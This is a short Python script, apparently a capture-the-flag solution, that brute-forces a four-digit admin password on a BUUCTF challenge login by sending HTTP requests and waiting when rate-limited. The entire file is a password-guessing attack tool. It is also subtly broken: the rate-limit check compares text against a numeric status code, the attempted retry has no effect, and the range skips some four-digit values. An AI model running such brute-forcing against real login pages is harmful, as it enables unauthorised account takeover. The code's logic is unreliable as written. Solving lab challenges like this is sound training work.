import time
import requests

url="http://23b71b6s-f202-4f59-9ab1-q19fcv1cda91.node4.buuoj.cn:81/?username=admin&password="

for i in range(1000, 9999):
    res = requests.get(url + str(i))
    print("[*] Try :" + str(i))
    if "429" in res.status_code:
        time.sleep(0.5)
        i = i-1
        continue
    if res.text != "密码错误，为四位数字。":
        print(res.text)
        break

